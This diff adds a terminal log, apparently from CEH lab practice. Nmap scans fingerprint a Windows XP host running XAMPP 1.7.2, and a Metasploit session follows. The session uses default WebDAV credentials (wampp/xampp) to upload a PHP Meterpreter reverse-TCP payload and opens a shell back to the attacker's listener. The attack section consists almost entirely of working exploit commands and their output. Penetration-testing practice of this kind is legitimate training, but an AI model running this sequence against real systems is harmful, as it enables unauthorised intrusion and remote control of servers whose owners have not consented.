@@ -1,0 +1,474 @@
+######################## NMAP Scanning
+
+root@kali:~/Desktop/CEH# nmap -vv -T5 -sV 192.168.0.159
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-03 15:00 IST
+NSE: Loaded 43 scripts for scanning.
+Initiating ARP Ping Scan at 15:00
+Scanning 192.168.0.159 [1 port]
+Completed ARP Ping Scan at 15:00, 0.26s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 15:00
+Completed Parallel DNS resolution of 1 host. at 15:00, 0.01s elapsed
+Initiating SYN Stealth Scan at 15:00
+Scanning 192.168.0.159 [1000 ports]
+Discovered open port 3306/tcp on 192.168.0.159
+Discovered open port 139/tcp on 192.168.0.159
+Discovered open port 80/tcp on 192.168.0.159
+Discovered open port 445/tcp on 192.168.0.159
+Discovered open port 443/tcp on 192.168.0.159
+Discovered open port 135/tcp on 192.168.0.159
+Discovered open port 2869/tcp on 192.168.0.159
+Completed SYN Stealth Scan at 15:00, 2.41s elapsed (1000 total ports)
+Initiating Service scan at 15:00
+Scanning 7 services on 192.168.0.159
+Completed Service scan at 15:00, 12.22s elapsed (7 services on 1 host)
+NSE: Script scanning 192.168.0.159.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 15:00
+Completed NSE at 15:00, 0.37s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 15:00
+Completed NSE at 15:00, 0.00s elapsed
+Nmap scan report for 192.168.0.159
+Host is up, received arp-response (0.031s latency).
+Scanned at 2019-08-03 15:00:02 IST for 15s
+Not shown: 974 closed ports
+Reason: 974 resets
+PORT      STATE    SERVICE         REASON          VERSION
+3/tcp     filtered compressnet     no-response
+4/tcp     filtered unknown         no-response
+80/tcp    open     http            syn-ack ttl 128 Apache httpd 2.2.12 ((Win32) DAV/2 mod_ssl/2.2.12 OpenSSL/0.9.8k mod_autoindex_color PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0)
+135/tcp   open     msrpc           syn-ack ttl 128 Microsoft Windows RPC
+139/tcp   open     netbios-ssn     syn-ack ttl 128 Microsoft Windows netbios-ssn
+340/tcp   filtered unknown         no-response
+443/tcp   open     ssl/http        syn-ack ttl 128 Apache httpd 2.2.12 ((Win32) DAV/2 mod_ssl/2.2.12 OpenSSL/0.9.8k mod_autoindex_color PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0)
+445/tcp   open     microsoft-ds    syn-ack ttl 128 Microsoft Windows XP microsoft-ds
+1163/tcp  filtered sddp            no-response
+1328/tcp  filtered ewall           no-response
+1839/tcp  filtered netopia-vo1     no-response
+2001/tcp  filtered dc              no-response
+2869/tcp  open     http            syn-ack ttl 128 Microsoft HTTPAPI httpd 1.0 (SSDP/UPnP)
+3306/tcp  open     mysql           syn-ack ttl 128 MySQL (Too many connections)
+3690/tcp  filtered svn             no-response
+5080/tcp  filtered onscreen        no-response
+5906/tcp  filtered unknown         no-response
+6567/tcp  filtered esp             no-response
+7000/tcp  filtered afs3-fileserver no-response
+9003/tcp  filtered unknown         no-response
+9102/tcp  filtered jetdirect       no-response
+9502/tcp  filtered unknown         no-response
+19315/tcp filtered keyshadow       no-response
+40193/tcp filtered unknown         no-response
+49176/tcp filtered unknown         no-response
+57797/tcp filtered unknown         no-response
+MAC Address: 60:30:D4:81:A1:60 (Unknown)
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.68 seconds
+           Raw packets sent: 1250 (54.968KB) | Rcvd: 982 (39.296KB)
+root@kali:~/Desktop/CEH# nmap -vv -T5 192.168.0.159 -A
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-03 15:01 IST
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 15:01
+Completed NSE at 15:01, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 15:01
+Completed NSE at 15:01, 0.00s elapsed
+Initiating ARP Ping Scan at 15:01
+Scanning 192.168.0.159 [1 port]
+Completed ARP Ping Scan at 15:01, 0.07s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 15:01
+Completed Parallel DNS resolution of 1 host. at 15:01, 0.01s elapsed
+Initiating SYN Stealth Scan at 15:01
+Scanning 192.168.0.159 [1000 ports]
+Discovered open port 445/tcp on 192.168.0.159
+Discovered open port 135/tcp on 192.168.0.159
+Discovered open port 443/tcp on 192.168.0.159
+Discovered open port 80/tcp on 192.168.0.159
+Discovered open port 139/tcp on 192.168.0.159
+Discovered open port 3306/tcp on 192.168.0.159
+Discovered open port 2869/tcp on 192.168.0.159
+Completed SYN Stealth Scan at 15:01, 1.27s elapsed (1000 total ports)
+Initiating Service scan at 15:01
+Scanning 7 services on 192.168.0.159
+Completed Service scan at 15:01, 12.15s elapsed (7 services on 1 host)
+Initiating OS detection (try #1) against 192.168.0.159
+NSE: Script scanning 192.168.0.159.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 15:01
+NSE Timing: About 99.79% done; ETC: 15:02 (0:00:00 remaining)
+Stats: 0:01:16 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE: Active NSE Script Threads: 1 (1 waiting)
+NSE Timing: About 99.90% done; ETC: 15:02 (0:00:00 remaining)
+Stats: 0:01:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE: Active NSE Script Threads: 1 (1 waiting)
+NSE Timing: About 99.90% done; ETC: 15:02 (0:00:00 remaining)
+Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE: Active NSE Script Threads: 1 (1 waiting)
+NSE Timing: About 99.90% done; ETC: 15:03 (0:00:00 remaining)
+Stats: 0:01:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE: Active NSE Script Threads: 1 (1 waiting)
+NSE Timing: About 99.90% done; ETC: 15:03 (0:00:00 remaining)
+Stats: 0:01:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE: Active NSE Script Threads: 1 (1 waiting)
+NSE Timing: About 99.90% done; ETC: 15:03 (0:00:00 remaining)
+NSE Timing: About 99.90% done; ETC: 15:03 (0:00:00 remaining)
+NSE Timing: About 99.90% done; ETC: 15:04 (0:00:00 remaining)
+Stats: 0:02:54 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE: Active NSE Script Threads: 1 (1 waiting)
+NSE Timing: About 99.90% done; ETC: 15:04 (0:00:00 remaining)
+Stats: 0:02:54 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE: Active NSE Script Threads: 1 (1 waiting)
+NSE Timing: About 99.90% done; ETC: 15:04 (0:00:00 remaining)
+Stats: 0:02:54 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE: Active NSE Script Threads: 1 (1 waiting)
+NSE Timing: About 99.90% done; ETC: 15:04 (0:00:00 remaining)
+NSE Timing: About 99.90% done; ETC: 15:05 (0:00:00 remaining)
+NSE Timing: About 99.90% done; ETC: 15:05 (0:00:00 remaining)
+NSE Timing: About 99.90% done; ETC: 15:06 (0:00:00 remaining)
+Completed NSE at 15:06, 251.70s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 15:06
+Completed NSE at 15:06, 0.00s elapsed
+Nmap scan report for 192.168.0.159
+Host is up, received arp-response (0.0044s latency).
+Scanned at 2019-08-03 15:01:42 IST for 266s
+Not shown: 993 closed ports
+Reason: 993 resets
+PORT     STATE SERVICE      REASON          VERSION
+80/tcp   open  http         syn-ack ttl 128 Apache httpd 2.2.12 ((Win32) DAV/2 mod_ssl/2.2.12 OpenSSL/0.9.8k mod_autoindex_color PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.12 (Win32) DAV/2 mod_ssl/2.2.12 OpenSSL/0.9.8k mod_autoindex_color PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0
+| http-title:             XAMPP            1.7.2        
+|_Requested resource was http://192.168.0.159/xampp/
+135/tcp  open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
+139/tcp  open  netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn
+443/tcp  open  ssl/http     syn-ack ttl 128 Apache httpd 2.2.12 ((Win32) DAV/2 mod_ssl/2.2.12 OpenSSL/0.9.8k mod_autoindex_color PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.12 (Win32) DAV/2 mod_ssl/2.2.12 OpenSSL/0.9.8k mod_autoindex_color PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0
+| http-title:             XAMPP            1.7.2        
+|_Requested resource was https://192.168.0.159/xampp/
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-04-15T22:04:42
+| Not valid after:  2019-04-13T22:04:42
+| MD5:   cb7e 4c94 2478 a700 6375 b381 3d00 22a8
+| SHA-1: e48b dd08 16e9 6dbe 014c 4c9d 5163 2c93 f776 a486
+| -----BEGIN CERTIFICATE-----
+| MIIBnzCCAQgCCQCzMvDcaWWN+jANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
+| b2NhbGhvc3QwHhcNMDkwNDE1MjIwNDQyWhcNMTkwNDEzMjIwNDQyWjAUMRIwEAYD
+| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAM36rZj1
+| jnQW8AqrxgrI0ABLZvl2BgaN2EoeAg169dtQdNLtXZEkd9wsnJNGdR8g058HJA5b
+| rCCoxw3k7kWACtt1QlgTGZtsNp4UM7LMjwzrxbq2reoQZdc5ZvAhiAc4eg7IKmXK
+| 8xQKXixCkMyEQ+VmumBGtNuyh3MVQ6nTKUWFAgMBAAEwDQYJKoZIhvcNAQEFBQAD
+| gYEAMLbbNrnVLQ8w6WR5MkuU3aiPTXedrVlW2CB1j5KxixphUHEwSHAQjLZPO6gZ
+| K6nrgjKJDwACHa3vabCnSx86OiIafwGuZTAA00Z8z2bKLP3plgGlolFFULD+LXhW
+| T0+T45zlTdOi3Q7hGtJx0iR9VTBGOY1ULKt2k/iPN74NDcE=
+|_-----END CERTIFICATE-----
+|_ssl-date: 2019-08-03T09:31:57+00:00; 0s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+445/tcp  open  microsoft-ds syn-ack ttl 128 Windows XP microsoft-ds
+2869/tcp open  http         syn-ack ttl 128 Microsoft HTTPAPI httpd 1.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/1.0
+|_http-title: Site doesn't have a title (text/html).
+3306/tcp open  mysql        syn-ack ttl 128 MySQL (Too many connections)
+MAC Address: 60:30:D4:81:A1:60 (Unknown)
+Device type: general purpose
+Running: Microsoft Windows XP|2003
+OS CPE: cpe:/o:microsoft:windows_xp::sp2:professional cpe:/o:microsoft:windows_server_2003
+OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=8/3%OT=80%CT=1%CU=31056%PV=Y%DS=1%DC=D%G=N%M=6030D4%TM
+OS:=5D455588%P=i686-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=101%CI=I%TS=0)OPS(O1=
+OS:M5B4NW0NNT00NNS%O2=M5B4NW0NNT00NNS%O3=M5B4NW0NNT00%O4=M5B4NW0NNT00NNS%O5
+OS:=M5B4NW0NNT00NNS%O6=M5B4NNT00NNS)WIN(W1=FAF0%W2=FB90%W3=FC80%W4=FB40%W5=
+OS:FB40%W6=FB8B)ECN(R=Y%DF=Y%T=80%W=FAF0%O=M5B4NW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T
+OS:=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T
+OS:3(R=Y%DF=Y%T=80%W=FB8B%S=O%A=S+%F=AS%O=M5B4NW0NNT00NNS%RD=0%Q=)T4(R=Y%DF
+OS:=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=80%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=80%W=
+OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=B0%UN=0%RIPL=G%RID=G%RIP
+OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=80%CD=Z)
+
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: Busy server or unknown class
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_clock-skew: mean: -1h50m00s, deviation: 3h10m31s, median: 0s
+| nbstat: NetBIOS name: HACKERSC-C6E8B1, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:dd:a9:0d (Oracle VirtualBox virtual NIC)
+| Names:
+|   HACKERSC-C6E8B1<00>  Flags: <unique><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   HACKERSC-C6E8B1<20>  Flags: <unique><active>
+|   WORKGROUP<1e>        Flags: <group><active>
+| Statistics:
+|   08 00 27 dd a9 0d 00 00 00 00 00 00 00 00 00 00 00
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 20287/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 29583/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 53522/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 34612/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: hackersc-c6e8b1
+|   NetBIOS computer name: HACKERSC-C6E8B1\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2019-08-03T15:01:57+05:30
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-security-mode: Couldn't establish a SMBv2 connection.
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   4.38 ms 192.168.0.159
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 15:06
+Completed NSE at 15:06, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 15:06
+Completed NSE at 15:06, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 267.30 seconds
+           Raw packets sent: 1105 (49.318KB) | Rcvd: 1017 (41.250KB)
+root@kali:~/Desktop/CEH# 
+
+
+
+
+########################################## Exploit in the web
+root@kali:~/Desktop/CEH# service postgresql start
+root@kali:~/Desktop/CEH# msfconsole -q
+
+msf > 
+msf > search xampp_webdav
+
+Matching Modules
+================
+
+   Name                                          Disclosure Date  Rank       Description
+   ----                                          ---------------  ----       -----------
+   exploit/windows/http/xampp_webdav_upload_php  2012-01-14       excellent  XAMPP WebDAV PHP Upload
+
+
+msf > use exploit/windows/http/xampp_webdav_upload_php
+msf exploit(windows/http/xampp_webdav_upload_php) > info
+
+       Name: XAMPP WebDAV PHP Upload
+     Module: exploit/windows/http/xampp_webdav_upload_php
+   Platform: PHP
+       Arch: php
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2012-01-14
+
+Provided by:
+  theLightCosine <theLightCosine@metasploit.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic
+
+Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  FILENAME                   no        The filename to give the payload. (Leave Blank for Random)
+  PASSWORD  xampp            no        The HTTP password to specify for authentication
+  PATH      /webdav/         yes       The path to attempt to upload
+  Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOST                      yes       The target address
+  RPORT     80               yes       The target port (TCP)
+  SSL       false            no        Negotiate SSL/TLS for outgoing connections
+  USERNAME  wampp            no        The HTTP username to specify for authentication
+  VHOST                      no        HTTP server virtual host
+
+Payload information:
+
+Description:
+  This module exploits weak WebDAV passwords on XAMPP servers. It uses 
+  supplied credentials to upload a PHP payload and execute it.
+
+msf exploit(windows/http/xampp_webdav_upload_php) > show payloads
+
+Compatible Payloads
+===================
+
+   Name                                Disclosure Date  Rank    Description
+   ----                                ---------------  ----    -----------
+   generic/custom                                       normal  Custom Payload
+   generic/shell_bind_tcp                               normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                            normal  Generic Command Shell, Reverse TCP Inline
+   php/bind_perl                                        normal  PHP Command Shell, Bind TCP (via Perl)
+   php/bind_perl_ipv6                                   normal  PHP Command Shell, Bind TCP (via perl) IPv6
+   php/bind_php                                         normal  PHP Command Shell, Bind TCP (via PHP)
+   php/bind_php_ipv6                                    normal  PHP Command Shell, Bind TCP (via php) IPv6
+   php/download_exec                                    normal  PHP Executable Download and Execute
+   php/exec                                             normal  PHP Execute Command 
+   php/meterpreter/bind_tcp                             normal  PHP Meterpreter, Bind TCP Stager
+   php/meterpreter/bind_tcp_ipv6                        normal  PHP Meterpreter, Bind TCP Stager IPv6
+   php/meterpreter/bind_tcp_ipv6_uuid                   normal  PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
+   php/meterpreter/bind_tcp_uuid                        normal  PHP Meterpreter, Bind TCP Stager with UUID Support
+   php/meterpreter/reverse_tcp                          normal  PHP Meterpreter, PHP Reverse TCP Stager
+   php/meterpreter/reverse_tcp_uuid                     normal  PHP Meterpreter, PHP Reverse TCP Stager
+   php/meterpreter_reverse_tcp                          normal  PHP Meterpreter, Reverse TCP Inline
+   php/reverse_perl                                     normal  PHP Command, Double Reverse TCP Connection (via Perl)
+   php/reverse_php                                      normal  PHP Command Shell, Reverse TCP (via PHP)
+
+msf exploit(windows/http/xampp_webdav_upload_php) > set payload php/meterpreter_reverse_tcp
+payload => php/meterpreter_reverse_tcp
+msf exploit(windows/http/xampp_webdav_upload_php) > show options
+
+Module options (exploit/windows/http/xampp_webdav_upload_php):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME                   no        The filename to give the payload. (Leave Blank for Random)
+   PASSWORD  xampp            no        The HTTP password to specify for authentication
+   PATH      /webdav/         yes       The path to attempt to upload
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                      yes       The target address
+   RPORT     80               yes       The target port (TCP)
+   SSL       false            no        Negotiate SSL/TLS for outgoing connections
+   USERNAME  wampp            no        The HTTP username to specify for authentication
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (php/meterpreter_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(windows/http/xampp_webdav_upload_php) > set FILENAME stud
+FILENAME => stud
+msf exploit(windows/http/xampp_webdav_upload_php) > set RHOST 192.168.0.159
+RHOST => 192.168.0.159
+msf exploit(windows/http/xampp_webdav_upload_php) > show options
+
+Module options (exploit/windows/http/xampp_webdav_upload_php):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  stud             no        The filename to give the payload. (Leave Blank for Random)
+   PASSWORD  xampp            no        The HTTP password to specify for authentication
+   PATH      /webdav/         yes       The path to attempt to upload
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST     192.168.0.159    yes       The target address
+   RPORT     80               yes       The target port (TCP)
+   SSL       false            no        Negotiate SSL/TLS for outgoing connections
+   USERNAME  wampp            no        The HTTP username to specify for authentication
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (php/meterpreter_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(windows/http/xampp_webdav_upload_php) > set LHOST 192.168.0.143
+LHOST => 192.168.0.143
+msf exploit(windows/http/xampp_webdav_upload_php) > show options
+
+Module options (exploit/windows/http/xampp_webdav_upload_php):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  stud             no        The filename to give the payload. (Leave Blank for Random)
+   PASSWORD  xampp            no        The HTTP password to specify for authentication
+   PATH      /webdav/         yes       The path to attempt to upload
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST     192.168.0.159    yes       The target address
+   RPORT     80               yes       The target port (TCP)
+   SSL       false            no        Negotiate SSL/TLS for outgoing connections
+   USERNAME  wampp            no        The HTTP username to specify for authentication
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (php/meterpreter_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.0.143    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(windows/http/xampp_webdav_upload_php) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.143:4444 
+[*] Uploading Payload to /webdav/stud.php
+[*] Attempting to execute Payload
+[*] Meterpreter session 1 opened (192.168.0.143:4444 -> 192.168.0.159:1090) at 2019-08-03 15:11:12 +0530
+
+meterpreter > sessoions
+[-] Unknown command: sessoions.
+meterpreter > 
+[-] Meterpreter session 1 is not valid and will be closed
+
+[*] 192.168.0.159 - Meterpreter session 1 closed.
+
+msf exploit(windows/http/xampp_webdav_upload_php) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.143:4444 
+[*] Uploading Payload to /webdav/stud.php
+[-] Failed to upload file!
+[*] Exploit completed, but no session was created.
+msf exploit(windows/http/xampp_webdav_upload_php) > 
+
+
